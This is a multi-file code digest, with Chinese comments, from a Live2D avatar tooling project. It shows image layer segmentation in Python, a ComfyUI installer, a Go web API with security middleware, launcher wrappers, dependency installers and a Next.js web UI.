            qr = (r // 32) * 32
            qg = (g // 32) * 32
            qb = (b // 32) * 32
            quantized.append((qr, qg, qb, a))

        # 统计颜色频率
        color_counts = {}
        for color in quantized:
            if color in color_counts:
                color_counts[color] += 1
            else:
                color_counts[color] = 1

        # 按频率排序取前k个
        sorted_colors = sorted(color_counts.items(), key=lambda x: x[1], reverse=True)
        top_colors = [c for c, _ in sorted_colors[:self.k_clusters]]

        # 创建图层
        layers = []
        for i, color in enumerate(top_colors):
            # 创建图层
            layer_img = Image.new('RGBA', (w, h), (0, 0, 0, 0))
            layer_pixels = list(layer_img.getdata())

            # 填充颜色
            for j, pix_color in enumerate(quantized):
                if pix_color[:3] == color[:3]:
                    layer_pixels[j] = pixels[j]

            layer_img.putdata(layer_pixels)
            layer_path = self.output_path / f"layer_{i:02d}.png"
            layer_img.save(layer_path)

            layers.append({
                'id': i,
                'color': color,
                'path': layer_path,
                'area': color_counts.get(color, 0)
            })

            print(f"   ✓ 图层 {i} 保存: {layer_path.name}")

        return layers

    def kmeans_segmentation(self, img, k=None):
        """使用K-means聚类进行颜色分割"""
        if not HAS_NUMPY:
            return None, None

        if k is None:
            k = self.k_clusters

        print(f"🎨 K-means分割 (k={k})...")

        img_array = np.array(img)
        img_rgb = img_array[:, :, :3]

        # 重塑图像为像素数组
        pixels = img_rgb.reshape(-1, 3)

        # 使用K-means聚类
        if HAS_SKLEARN:
            try:
                kmeans = KMeans(n_clusters=k, random_state=42, n_init=10)
                labels = kmeans.fit_predict(pixels)
                centers = kmeans.cluster_centers_.astype(np.uint8)
                # 重建图像
                segmented = centers[labels].reshape(img_rgb.shape)
                return segmented, labels.reshape(img_rgb.shape[:2])
            except Exception as e:
                print(f"⚠️ K-means失败: {e}，使用简单颜色检测")
        else:
            print("⚠️ scikit-learn未安装，使用简单颜色量化")

        # 降级方案：简单量化
        return self.simple_quantization(img_array, k)

    def simple_quantization(self, img_array, k):
        """简单颜色量化（降级方案）"""
        if not HAS_NUMPY:
            return None, None

        img_rgb = img_array[:, :, :3]
        # 简单的位深度降低
        factor = 256 // k
        quantized = (img_rgb // factor) * factor
        # 创建标签
        unique_colors = np.unique(quantized.reshape(-1, 3), axis=0)
        color_to_label = {tuple(color): i for i, color in enumerate(unique_colors)}

        # 向量化标签创建
        h, w, _ = img_rgb.shape
        labels = np.zeros((h, w), dtype=np.int32)
        for i, color in enumerate(unique_colors):
            mask = np.all(quantized == color, axis=2)
            labels[mask] = i

        return quantized, labels

    def create_layers_from_numpy(self, img_array, labels):
        """从numpy数组创建图层"""
        h, w = img_array.shape[:2]
        unique_labels = np.unique(labels)

        layers = []

        print(f"📦 创建 {len(unique_labels)} 个图层...")

        for i, label in enumerate(unique_labels):
            # 创建掩码
            mask = (labels == label)

            # 创建透明图层
            layer = np.zeros((h, w, 4), dtype=np.uint8)

            # 复制颜色和透明度
            layer[:, :, :3] = img_array[:, :, :3]
            layer[:, :, 3] = mask.astype(np.uint8) * 255

            # 保存图层
            layer_img = Image.fromarray(layer, 'RGBA')
            layer_path = self.output_path / f"layer_{i:02d}.png"
            layer_img.save(layer_path)

            layers.append({
                'id': i,
                'label': label,
                'path': layer_path,
                'area': np.sum(mask)
            })

            print(f"   ✓ 图层 {i} 保存: {layer_path.name}")

        return layers

    def create_combined_preview(self, layers, img):
        """创建组合预览"""
        preview_path = self.output_path / "preview.png"
        img.save(preview_path)
        print(f"📋 预览图保存: {preview_path}")
        return preview_path

    def create_layer_guide(self, layers):
        """创建图层指南"""
        guide_path = self.output_path / "LAYER_GUIDE.txt"

        with open(guide_path, 'w', encoding='utf-8') as f:
            f.write("Live2D Layer Tool v6.0 - 图层指南\n")
            f.write("="*50 + "\n\n")
            f.write(f"输入文件: {self.input_path.name}\n")
            f.write(f"聚类数: {self.k_clusters}\n")
            f.write(f"阈值: {self.threshold}\n")
            f.write(f"模式: {'K-means (高级)' if HAS_NUMPY and HAS_SKLEARN else 'Simple (基础)'}\n\n")
            f.write("图层列表（按面积排序）:\n")
            f.write("-"*50 + "\n")


...（省略后续 126 行，原文件共 376 行）...

```

## See-through 安装器（节选）
**文件**：`.trae/skills/live2d-master-agent/install_comfyui_advanced.py`
```
#!/usr/bin/env python3
"""
ComfyUI + See-through 自动安装脚本 v2.0
用于Live2D Master Agent项目

功能:
1. 自动检测操作系统
2. 安装ComfyUI
3. 安装See-through插件
4. 下载必要的AI模型
5. 提供使用指南
6. 支持非交互模式（--yes）

改进:
- 更好的错误处理
- 支持非交互模式
- 更好的用户提示
- 进度显示
"""

import os
import sys
import subprocess
import urllib.request
import zipfile
from pathlib import Path
import argparse
import time


def _get_project_root() -> Path:
    """返回项目根目录。根目录包装器通过 LIVE2D_PROJECT_ROOT 指定。"""
    return Path(os.environ.get("LIVE2D_PROJECT_ROOT", Path(__file__).parent))


class ComfyUIInstaller:
    """ComfyUI + See-through 安装器"""

    def __init__(self, interactive=True):
        self.base_dir = _get_project_root()
        self.comfyui_dir = self.base_dir / "comfyui"
        self.system = sys.platform
        self.interactive = interactive
        self.log_file = self.base_dir / "install_log.txt"

    def log(self, message):
        """记录日志到文件"""
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        log_msg = f"[{timestamp}] {message}\n"
        try:
            with open(self.log_file, 'a', encoding='utf-8') as f:
                f.write(log_msg)
        except:
            pass
        print(message)

    def print_header(self):
        """打印标题"""
        self.log("\n" + "="*80)
        self.log("🎨 ComfyUI + See-through 自动安装向导 v2.0")
        self.log("="*80)
        self.log("\n这将安装:")
        self.log("  • ComfyUI - AI工作流工具")
        self.log("  • ComfyUI-See-through - 动漫分层插件")
        self.log("  • See-through AI模型 - SIGGRAPH 2026级别分层工具")
        self.log("\n预计需要: 20-40GB磁盘空间")
        self.log("="*80 + "\n")

    def check_system(self):
        """检查系统环境"""
        self.log("🔍 检查系统环境...")

        info = {
            'system': sys.platform,
            'python': sys.version.split()[0],
            'has_git': self._command_exists('git'),
            'has_cuda': False,
            'disk_space': 0
        }

        # 检查CUDA
        try:
            result = subprocess.run(['nvidia-smi'], capture_output=True, timeout=10)
            if result.returncode == 0:
                info['has_cuda'] = True
                self.log(f"  ✅ NVIDIA GPU detected")
        except:
            pass

        # Python版本
        python_ok = False
        try:
            py_version = tuple(map(int, info['python'].split('.')))
            if (3, 8) <= py_version < (3, 14):
                python_ok = True
        except:
            pass

        if python_ok:
            self.log(f"  ✅ Python {info['python']} supported")
        else:
            self.log(f"  ⚠️  Python {info['python']} might have issues")

        # Git检查
        if info['has_git']:
            self.log(f"  ✅ Git installed")
        else:
            self.log(f"  ⚠️  Git not found (recommended for installation)")

        # 磁盘空间检查
        try:
            import shutil
            usage = shutil.disk_usage(self.base_dir)
            free_gb = usage.free / (1024**3)
            self.log(f"  💾 可用磁盘空间: {free_gb:.1f}GB")
        except:
            pass

        return info

    def _command_exists(self, cmd):
        """检查命令是否存在"""
        try:
            # 对于Windows需要shell=True，Linux不需要
            shell = self.system == 'win32'
            result = subprocess.run(
                [cmd] if not shell else f'where {cmd}',
                capture_output=True,
                timeout=5,
                shell=shell
            )
            return result.returncode == 0
        except:
            return False

    def _ask_yes_no(self, question, default=True):
        """询问用户问题，返回布尔值"""
        if not self.interactive:
            return default

        while True:
            response = input(question).strip().lower()
            if not response:
                return default
            if response in ['y', 'yes', '是']:
                return True
            elif response in ['n', 'no', '否']:
                return False
            self.log("  请输入 y/n 或 yes/no")

    def install_comfyui(self):
        """安装ComfyUI"""
        self.log("\n📦 安装ComfyUI...")

        if self.comfyui_dir.exists():
            self.log(f"  ⚠️  ComfyUI目录已存在: {self.comfyui_dir}")
            if self._ask_yes_no("  是否更新? (y/n, 默认n): ", default=False):
                try:
                    self.log("  📥 拉取更新...")
                    result = subprocess.run(
                        ['git', 'pull'],
                        cwd=str(self.comfyui_dir),
                        capture_output=True,
                        text=True,
                        timeout=300
                    )
                    if result.returncode == 0:
                        self.log("  ✅ ComfyUI更新成功")
                        return True
                    else:
                        self.log(f"  ⚠️  更新失败: {result.stderr}")
                        return False
                except Exception as e:
                    self.log(f"  ⚠️  更新失败: {e}")
                    return False
            else:
                self.log("  ⏭️  跳过ComfyUI安装")
                return True

        try:
            self.log("  📥 克隆ComfyUI仓库...")
            result = subprocess.run(
                ['git', 'clone', '--depth', '1',
                 'https://github.com/comfyanonymous/ComfyUI.git',
                 str(self.comfyui_dir)],
                capture_output=True,
                text=True,
                timeout=600
            )
            if result.returncode != 0:
                raise Exception(f"Git clone failed: {result.stderr}")

            self.log("  ✅ ComfyUI克隆成功")
            return True

        except subprocess.TimeoutExpired:
            self.log("  ❌ Git克隆超时，请检查网络连接")
            return False
        except Exception as e:
            self.log(f"  ❌ 安装失败: {e}")

...（省略后续 257 行，原文件共 457 行）...

```

## Go API 入口（节选）
**文件**：`.trae/skills/live2d-master-agent/api/main.go`
```
package main

import (
	"flag"
	"fmt"
	"log"
	"net/http"
	"os"
	"runtime"
	"strings"
	"time"

	"github.com/gin-contrib/gzip"
	"github.com/gin-gonic/gin"

	"live2d-api/config"
	"live2d-api/handlers"
	"live2d-api/services"
)

func main() {
	// 命令行参数
	var (
		configPath = flag.String("config", "", "配置文件路径")
		host       = flag.String("host", "", "服务器地址")
		port       = flag.Int("port", 0, "服务器端口")
	)
	flag.Parse()

	// 加载配置
	cfg, err := config.LoadConfig(*configPath)
	if err != nil {
		log.Fatalf("加载配置失败: %v", err)
	}

	// 命令行参数覆盖配置
	if *host != "" {
		cfg.Server.Host = *host
	}
	if *port != 0 {
		cfg.Server.Port = *port
	}

	// 设置最大并发数为 CPU 核心数的 2 倍
	runtime.GOMAXPROCS(runtime.NumCPU() * 2)

	// 确保输出目录存在
	os.MkdirAll(cfg.Output.BaseDir, 0755)

	// 设置 Gin 模式
	gin.SetMode(gin.ReleaseMode)

	// 创建路由
	r := gin.Default()

	// ========== 安全中间件 ==========

	// Gzip 压缩中间件（提升响应速度）
	r.Use(gzip.Gzip(gzip.DefaultCompression))

	// 请求体大小限制中间件
	r.Use(func(c *gin.Context) {
		c.Request.Body = http.MaxBytesReader(c.Writer, c.Request.Body, cfg.Server.MaxRequestBodySize)
		c.Next()
	})

	// 请求超时中间件
	r.Use(func(c *gin.Context) {
		c.Request.Header.Set("Connection", "keep-alive")
		c.Next()
	})

	// 安全响应头中间件
	r.Use(func(c *gin.Context) {
		c.Header("X-Content-Type-Options", "nosniff")
		c.Header("X-Frame-Options", "DENY")
		c.Header("X-XSS-Protection", "1; mode=block")
		c.Header("Referrer-Policy", "strict-origin-when-cross-origin")
		c.Header("Content-Security-Policy", "default-src 'self'")
		c.Header("Strict-Transport-Security", "max-age=31536000; includeSubDomains")
		c.Next()
	})

	// 输入验证中间件 - 防止恶意请求
	r.Use(validateRequestMiddleware())

	// 速率限制中间件 - 防止API滥用
	r.Use(rateLimitMiddleware(cfg))

	// CORS 中间件
	r.Use(func(c *gin.Context) {
		origin := c.Request.Header.Get("Origin")
		if origin != "" {
			// 生产环境中应使用白名单验证 origin
			allowedOrigins := cfg.Server.AllowedOrigins
			if len(allowedOrigins) == 0 || contains(allowedOrigins, origin) {
				c.Header("Access-Control-Allow-Origin", origin)
				c.Header("Access-Control-Allow-Methods", "GET, POST, OPTIONS, PUT, DELETE")
				c.Header("Access-Control-Allow-Headers", "Content-Type, Authorization")
				c.Header("Access-Control-Allow-Credentials", "true")
			}
		}
		if c.Request.Method == "OPTIONS" {
			c.AbortWithStatus(http.StatusNoContent)
			return
		}
		c.Next()
	})

	// ========== 创建服务和处理器 ==========

	// 创建图像生成服务（带缓存）
	imageService := services.NewImageGenerator(cfg)
	cacheService := services.NewRequestCache(cfg.Cache)

	// 创建处理器
	h := handlers.NewHandler(cfg, imageService, cacheService)

	// ========== 注册路由 ==========
	setupRoutes(r, h)

	// ========== 启动服务器 ==========
	addr := fmt.Sprintf("%s:%d", cfg.Server.Host, cfg.Server.Port)

	printServerInfo(cfg, addr)

	// 配置高性能 HTTP 服务器
	server := &http.Server{
		Addr:              addr,
		Handler:           r,
		ReadHeaderTimeout: cfg.Server.ReadHeaderTimeout,
		ReadTimeout:       cfg.Server.ReadTimeout,
		WriteTimeout:      cfg.Server.WriteTimeout,
		IdleTimeout:       cfg.Server.IdleTimeout,
		MaxHeaderBytes:    cfg.Server.MaxHeaderBytes,
	}

	if err := server.ListenAndServe(); err != nil {
		log.Fatalf("服务器启动失败: %v", err)
	}
}

func setupRoutes(r *gin.Engine, h *handlers.Handler) {
	// API 路由组
	api := r.Group("/api")
	{
		api.GET("/health", h.HealthCheck)
		api.GET("/status", h.GetSystemStatus)
		api.GET("/info", h.GetAPIInfo)
		api.GET("/models", h.GetModels)
		api.POST("/generate", h.GenerateImage)
		api.POST("/psd-plan", h.CreatePSDPlan)
		api.POST("/see-through", h.RunSeeThrough)
		api.GET("/scripts", h.GetPythonScripts)
		api.GET("/cache/stats", h.GetCacheStats)
		api.POST("/cache/clear", h.ClearCache)
	}

	// 静态文件服务（带缓存）
	r.GET("/output/:filename", h.ServeOutput)

	// 根路径
	r.GET("/", h.GetAPIInfo)
}

func printServerInfo(cfg *config.Config, addr string) {
	separator := strings.Repeat("=", 80)
	fmt.Println("\n" + separator)
	fmt.Println("║     🎨 Live2D Master Agent API v7.1 (Go Edition)           ║")
	fmt.Println("║     高性能优化版本 - 支持连接池、并发处理、请求缓存          ║")
	fmt.Println(separator)
	fmt.Printf("║  服务地址: http://%s\n", addr)
	fmt.Printf("║  输出目录: %s\n", cfg.Output.BaseDir)
	fmt.Printf("║  Python:   %s\n", cfg.Python.PythonPath)
	fmt.Printf("║  最大并发: %d\n", runtime.NumCPU()*2)
	fmt.Printf("║  缓存大小: %dMB\n", cfg.Cache.MaxSizeMB)
	fmt.Println(separator)
	fmt.Println("║  API 端点:                                                   ║")
	fmt.Println("║    GET  /api/health      - 健康检查                         ║")
	fmt.Println("║    GET  /api/status      - 系统状态                         ║")

...（省略后续 113 行，原文件共 293 行）...

```

## HTTP 处理器（节选）
**文件**：`.trae/skills/live2d-master-agent/api/handlers/handlers.go`
```
package handlers

import (
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/gin-gonic/gin"

	"live2d-api/config"
	"live2d-api/models"
	"live2d-api/services"
)

type Handler struct {
	cfg            *config.Config
	imageGenerator *services.ImageGenerator
	pythonBridge   *services.PythonBridge
	cache          *services.RequestCache
	startTime      time.Time
}

func NewHandler(cfg *config.Config, imageGenerator *services.ImageGenerator, cache *services.RequestCache) *Handler {
	h := &Handler{
		cfg:            cfg,
		imageGenerator: imageGenerator,
		pythonBridge:   services.NewPythonBridge(cfg),
		cache:          cache,
		startTime:      time.Now(),
	}

	// 启动缓存清理守护进程
	if cache != nil {
		cache.StartCleanupDaemon(5 * time.Minute)
	}

	return h
}

// HealthCheck 健康检查
func (h *Handler) HealthCheck(c *gin.Context) {
	c.JSON(http.StatusOK, models.Response{
		Success: true,
		Message: "Live2D API 服务正常运行",
		Data: map[string]interface{}{
			"version": "v7.1-go",
			"uptime":  time.Since(h.startTime).String(),
		},
	})
}

// GetSystemStatus 获取系统状态
func (h *Handler) GetSystemStatus(c *gin.Context) {
	var services []models.ServiceStatus

	// 本地生成器状态
	localAvailable, localMsg := h.imageGenerator.CheckLocalGeneratorStatus()
	services = append(services, models.ServiceStatus{
		Name:        "local_generator",
		Available:   localAvailable,
		Version:     localMsg,
		LastChecked: time.Now(),
	})

	// Python 环境
	pyOK, pyIssues := h.pythonBridge.CheckPythonEnvironment()
	pyStatus := "正常"
	if !pyOK {
		pyStatus = "异常: " + strings.Join(pyIssues, ", ")
	}
	services = append(services, models.ServiceStatus{
		Name:        "python_env",
		Available:   pyOK,
		Version:     pyStatus,
		LastChecked: time.Now(),
	})

	// See-through 状态
	seeThroughOK := h.pythonBridge.CheckSeeThroughInstalled()
	services = append(services, models.ServiceStatus{
		Name:        "see_through",
		Available:   seeThroughOK,
		Version:     "SIGGRAPH 2026",
		LastChecked: time.Now(),
	})

	// 缓存服务状态
	if h.cache != nil {
		_ = h.cache.Stats() // 调用Stats保持接口一致性
		services = append(services, models.ServiceStatus{
			Name:        "request_cache",
			Available:   true,
			Version:     "enabled",
			LastChecked: time.Now(),
		})
	}

	c.JSON(http.StatusOK, models.Response{
		Success: true,
		Data: models.SystemStatus{
			Services: services,
			Version:  "v7.1-go",
			Uptime:   time.Since(h.startTime).String(),
		},
	})
}

// GenerateImage 生成图片（支持缓存）
func (h *Handler) GenerateImage(c *gin.Context) {
	var req models.GenerateImageRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, models.Response{
			Success: false,
			Error:   "请求参数错误: " + err.Error(),
		})
		return
	}

	// 尝试从缓存获取
	var result *models.GenerateImageResponse
	var fromCache bool

	if h.cache != nil && req.Seed != 0 {
		result, fromCache = h.cache.Get(req.Prompt, req.Width, req.Height, req.Seed, req.ModelID)
	}

	if !fromCache {
		// 缓存未命中，生成图片
		var err error
		result, err = h.imageGenerator.GenerateImage(req)
		if err != nil {
			c.JSON(http.StatusInternalServerError, models.Response{
				Success: false,
				Error:   "图片生成失败: " + err.Error(),
			})
			return
		}

		// 将结果存入缓存
		if h.cache != nil && req.Seed != 0 {
			h.cache.Set(req.Prompt, req.Width, req.Height, req.Seed, req.ModelID, result)
		}
	}

	response := models.Response{
		Success: true,
		Message: "图片生成成功",
		Data:    result,
	}

	if fromCache {
		response.Message = "图片生成成功（来自缓存）"
		response.Data = map[string]interface{}{
			"result":     result,
			"from_cache": true,
		}
	}

	c.JSON(http.StatusOK, response)
}

// GetModels 获取可用模型列表
func (h *Handler) GetModels(c *gin.Context) {
	availableModels := h.imageGenerator.GetAvailableModels()
	c.JSON(http.StatusOK, models.Response{
		Success: true,
		Message: "获取模型列表成功",
		Data:    availableModels,
	})
}

// CreatePSDPlan 创建 PSD 分层规划
func (h *Handler) CreatePSDPlan(c *gin.Context) {
	var req models.PSDLayerRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, models.Response{
			Success: false,
			Error:   "请求参数错误: " + err.Error(),

...（省略后续 177 行，原文件共 357 行）...

```

## 根目录 Agent 包装器
**文件**：`live2d_agent.py`
```
#!/usr/bin/env python3
"""Auto-redirect wrapper - delegates to the actual implementation
located in .trae/skills/live2d-master-agent/live2d_agent.py.
Generated by root-level fix. Do not edit manually."""
import os
import sys

# Fix Windows GBK terminal encoding for emoji output
if sys.stdout and hasattr(sys.stdout, "reconfigure"):
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass
if sys.stderr and hasattr(sys.stderr, "reconfigure"):
    try:
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

_HERE = os.path.dirname(os.path.abspath(__file__))
_SKILL_DIR = os.path.join(_HERE, ".trae", "skills", "live2d-master-agent")
_ORIG_CWD = os.getcwd()


def _check_core_dependencies():
    """Check that the minimal dependencies are importable before running."""
    missing = []
    for mod in ("PIL", "numpy", "requests", "psd_tools"):
        try:
            __import__(mod)
        except ImportError:
            missing.append(mod.replace("_", "-"))
    if missing:
        print("[ERROR] Missing required dependencies:", ", ".join(missing), file=sys.stderr)
        print("[INFO] Run the installer to install compatible dependencies:", file=sys.stderr)
        print("       python install.py", file=sys.stderr)
        print("[INFO] Or manually install core packages:", file=sys.stderr)
        print("       python -m pip install Pillow numpy requests psd-tools scipy scikit-learn", file=sys.stderr)
        sys.exit(1)


if not os.path.isdir(_SKILL_DIR):
    print(f"[ERROR] Skill implementation not found: {_SKILL_DIR}", file=sys.stderr)
    print("[ERROR] Please clone the repository completely.", file=sys.stderr)
    sys.exit(1)

_check_core_dependencies()

# Tell the skill where the project root is so outputs/config go to the root
# directory when the user runs commands from the repository root.
os.environ.setdefault("LIVE2D_PROJECT_ROOT", _HERE)
os.environ.setdefault("LIVE2D_SKILL_DIR", _SKILL_DIR)

# Convert relative path arguments to absolute (before chdir)
_new_argv = [sys.argv[0]]
for _arg in sys.argv[1:]:
    if not _arg.startswith("-") and (
        os.path.exists(os.path.join(_ORIG_CWD, _arg))
        or os.sep in _arg
    ):
        _new_argv.append(os.path.abspath(os.path.join(_ORIG_CWD, _arg)))
    else:
        _new_argv.append(_arg)
sys.argv = _new_argv

os.chdir(_SKILL_DIR)
sys.argv[0] = "live2d_agent.py"
sys.path.insert(0, _SKILL_DIR)

_target = os.path.join(_SKILL_DIR, "live2d_agent.py")
with open(_target, "r", encoding="utf-8") as _f:
    _code = _f.read()
exec(compile(_code, _target, "exec"), {"__name__": "__main__", "__file__": _target})

```

## 根目录工具箱包装器
**文件**：`master_tool.py`
```
#!/usr/bin/env python3
"""Auto-redirect wrapper - delegates to the actual implementation
located in .trae/skills/live2d-master-agent/master_tool.py.
Generated by root-level fix. Do not edit manually."""
import os
import sys

# Fix Windows GBK terminal encoding for emoji output
if sys.stdout and hasattr(sys.stdout, "reconfigure"):
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass
if sys.stderr and hasattr(sys.stderr, "reconfigure"):
    try:
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

_HERE = os.path.dirname(os.path.abspath(__file__))
_SKILL_DIR = os.path.join(_HERE, ".trae", "skills", "live2d-master-agent")
_ORIG_CWD = os.getcwd()


def _check_core_dependencies():
    """Check that the minimal dependencies are importable before running."""
    missing = []
    for mod in ("PIL", "numpy", "requests", "psd_tools"):
        try:
            __import__(mod)
        except ImportError:
            missing.append(mod.replace("_", "-"))
    if missing:
        print("[ERROR] Missing required dependencies:", ", ".join(missing), file=sys.stderr)
        print("[INFO] Run the installer to install compatible dependencies:", file=sys.stderr)
        print("       python install.py", file=sys.stderr)
        print("[INFO] Or manually install core packages:", file=sys.stderr)
        print("       python -m pip install Pillow numpy requests psd-tools scipy scikit-learn", file=sys.stderr)
        sys.exit(1)


if not os.path.isdir(_SKILL_DIR):
    print(f"[ERROR] Skill implementation not found: {_SKILL_DIR}", file=sys.stderr)
    print("[ERROR] Please clone the repository completely.", file=sys.stderr)
    sys.exit(1)

_check_core_dependencies()

# Tell the skill where the project root is so outputs/config go to the root
# directory when the user runs commands from the repository root.
os.environ.setdefault("LIVE2D_PROJECT_ROOT", _HERE)
os.environ.setdefault("LIVE2D_SKILL_DIR", _SKILL_DIR)

# Convert relative path arguments to absolute (before chdir)
_new_argv = [sys.argv[0]]
for _arg in sys.argv[1:]:
    if not _arg.startswith("-") and (
        os.path.exists(os.path.join(_ORIG_CWD, _arg))
        or os.sep in _arg
    ):
        _new_argv.append(os.path.abspath(os.path.join(_ORIG_CWD, _arg)))
    else:
        _new_argv.append(_arg)
sys.argv = _new_argv

os.chdir(_SKILL_DIR)
sys.argv[0] = "master_tool.py"
sys.path.insert(0, _SKILL_DIR)

_target = os.path.join(_SKILL_DIR, "master_tool.py")
with open(_target, "r", encoding="utf-8") as _f:
    _code = _f.read()
exec(compile(_code, _target, "exec"), {"__name__": "__main__", "__file__": _target})

```

## 兼容性安装脚本
**文件**：`install.py`
```
#!/usr/bin/env python3
"""
Live2D Master Agent - 兼容性安装脚本

自动检测 Python 版本和操作系统，安装可用的依赖，跳过当前环境不支持的包。

用法:
    python install.py
    python install.py --full    # 尝试安装所有依赖（包括可选）
"""
import os
import sys
import subprocess
import platform
from pathlib import Path


CORE_DEPS = [
    "Pillow>=10.0.0",
    "numpy>=1.24.0",
    "requests>=2.31.0",
    "urllib3>=2.0.0",
    "httpx>=0.24.0",
    "psd-tools>=1.9.0",
    "scipy>=1.10.0",
    "scikit-learn>=1.3.0",
]

OPTIONAL_DEPS = [
    "opencv-python>=4.8.0",
    "onnxruntime>=1.14.0",
    "rembg[cpu]>=2.0.0",
]


def _get_project_root() -> Path:
    return Path(__file__).resolve().parent


def get_python_version() -> tuple[int, int]:
    return sys.version_info.major, sys.version_info.minor


def run_pip(args: list[str]) -> int:
    """使用当前解释器的 pip 安装，避免 Windows pip launcher 问题。"""
    cmd = [sys.executable, "-m", "pip"] + args
    print(f"> {' '.join(cmd)}")
    return subprocess.run(cmd).returncode


def install_package(package: str) -> bool:
    """安装单个包，失败时返回 False 但不中断流程。"""
    print(f"\n[INSTALL] {package}")
    code = run_pip(["install", "--upgrade", package])
    if code != 0:
        print(f"[WARN] 安装失败（跳过）: {package}")
        return False
    print(f"[OK] {package}")
    return True


def install_pygame(py_major: int, py_minor: int) -> bool:
    """根据 Python 版本选择合适的 pygame 包。"""
    if py_major == 3 and py_minor >= 14:
        pkg = "pygame-ce>=2.5.0"
    else:
        pkg = "pygame>=2.5.0"
    print(f"\n[INSTALL] 桌面桌宠渲染库: {pkg}")
    code = run_pip(["install", "--upgrade", pkg])
    if code != 0:
        print("[WARN] 桌面桌宠依赖安装失败，桌宠功能可能不可用")
        return False
    print(f"[OK] {pkg}")
    return True


def write_env_example() -> None:
    """如果 .env 不存在，复制示例文件。"""
    root = _get_project_root()
    env_file = root / ".env"
    example_file = root / ".env.example"
    skill_example = root / ".trae" / "skills" / "live2d-master-agent" / ".env.example"

    if env_file.exists():
        return

    source = example_file if example_file.exists() else skill_example
    if source.exists():
        env_file.write_text(source.read_text(encoding="utf-8"), encoding="utf-8")
        print(f"[OK] 已创建 {env_file}")


def main() -> int:
    py_major, py_minor = get_python_version()
    print("=" * 60)
    print(" Live2D Master Agent - 兼容性安装脚本")
    print("=" * 60)
    print(f"Python 版本: {platform.python_version()}")
    print(f"操作系统: {platform.system()} {platform.release()}")
    print(f"项目根目录: {_get_project_root()}")
    print("=" * 60)

    if py_major < 3 or (py_major == 3 and py_minor < 8):
        print("[ERROR] 需要 Python 3.8 或更高版本")
        return 1

    if py_major == 3 and py_minor >= 14:
        print("\n[INFO] 检测到 Python 3.14+，部分可选依赖可能没有预编译包。")
        print("       本脚本会先安装核心依赖，再尝试安装可选依赖。\n")

    # 升级 pip 自身，减少 launcher 错误
    print("\n[STEP 1/4] 升级 pip...")
    run_pip(["install", "--upgrade", "pip"])

    # 安装核心依赖
    print("\n[STEP 2/4] 安装核心依赖...")
    failed_core = []
    for dep in CORE_DEPS:
        if not install_package(dep):
            failed_core.append(dep)

    if failed_core:
        print("\n[ERROR] 以下核心依赖安装失败，项目可能无法正常运行:")
        for dep in failed_core:
            print(f"  - {dep}")
        print("\n建议:")
        print("  1. 使用 Python 3.11 或 3.12（兼容性最好）")
        print("  2. 安装 Microsoft C++ Build Tools（Windows）")
        return 1

    # 安装桌面桌宠依赖
    print("\n[STEP 3/4] 安装桌面桌宠依赖...")
    install_pygame(py_major, py_minor)

    # 安装可选依赖
    print("\n[STEP 4/4] 安装可选依赖（失败会自动跳过）...")
    install_full = "--full" in sys.argv
    for dep in OPTIONAL_DEPS:
        if not install_package(dep):
            if install_full:
                print(f"[WARN] {dep} 安装失败，但 --full 模式继续")
            else:
                print(f"[INFO] 跳过 {dep}，不影响核心功能")

    write_env_example()

    print("\n" + "=" * 60)
    print(" 安装完成")
    print("=" * 60)
    print("\n现在可以运行:")

...（省略后续 8 行，原文件共 158 行）...

```

## Python 依赖
**文件**：`requirements.txt`
```
# Live2D Master Agent - Python Requirements
#
# Installation:
#   python -m pip install -r requirements.txt
#
# Windows users: If `pip install` fails with "Fatal error in launcher",
# use `python -m pip install -r requirements.txt` instead.
#
# For Python 3.14+: If some optional packages fail to install, run
# `python install.py` to install only compatible dependencies.
#

# ====== Core Dependencies (Required) ======
Pillow>=10.0.0
numpy>=1.24.0
requests>=2.31.0
urllib3>=2.0.0
httpx>=0.24.0

# ====== Recommended Dependencies (Strongly advised for full features) ======
# PSD file handling
psd-tools>=1.9.0

# Quality assessment and layer separation
scipy>=1.10.0
scikit-learn>=1.3.0

# ====== Optional Dependencies (may fail on fresh Python 3.14) ======
# Install via `python install.py` for automatic compatibility handling.
# Computer vision (edge detection, etc.)
opencv-python>=4.8.0

# Desktop pet rendering (v7.2 new feature)
pygame>=2.5.0; python_version < "3.14"
pygame-ce>=2.5.0; python_version >= "3.14"

# AI background removal (optional, may need build tools)
onnxruntime>=1.14.0
rembg[cpu]>=2.0.0

# ====== Optional Dependencies ======
# Local Stable Diffusion generation (requires large VRAM)
# diffusers>=0.20.0
# transformers>=4.30.0
# torch>=2.0.0
# accelerate>=0.20.0

# Hugging Face model download
# huggingface-hub>=0.17.0


```

## Web UI 依赖
**文件**：`web/package.json`
```
{
  "name": "live2d-psd-qa",
  "version": "1.0.0",
  "private": true,
  "description": "Live2D PSD QA Assistant - Web版 PSD 质量检测工具",
  "scripts": {
    "dev": "next dev",
    "build": "next build",
    "start": "next start",
    "lint": "next lint"
  },
  "dependencies": {
    "next": "^16.2.6",
    "react": "^18.3.1",
    "react-dom": "^18.3.1"
  },
  "devDependencies": {
    "@types/node": "^20.12.0",
    "@types/react": "^18.3.0",
    "@types/react-dom": "^18.3.0",
    "autoprefixer": "^10.4.19",
    "postcss": "^8.5.14",
    "tailwindcss": "^3.4.3",
    "typescript": "^5.4.0"
  },
  "overrides": {
    "postcss": "^8.5.14"
  }
}

```

## Web 主页（节选）
**文件**：`web/pages/index.tsx`
```
import { useState, useCallback, useMemo, useEffect, useRef } from 'react';
import type { NextPage } from 'next';
import dynamic from 'next/dynamic';
import UploadArea from '../components/UploadArea';
import LayerTree from '../components/LayerTree';
import QAResult from '../components/QAResult';
import SEO from '../components/SEO';
import ErrorBoundary from '../components/ErrorBoundary';
import WorkflowTracker from '../components/WorkflowTracker';
import { parsePSD } from '../lib/psd-parser';
import { analyzePSD, getEnhancedResult, QAIssue } from '../lib/qa-engine';
import { getErrorMessage } from '../lib/utils';
import { Live2DWorkflow } from '../lib-shared/workflow';
import { STEP_NAMES } from '../lib-shared/types';

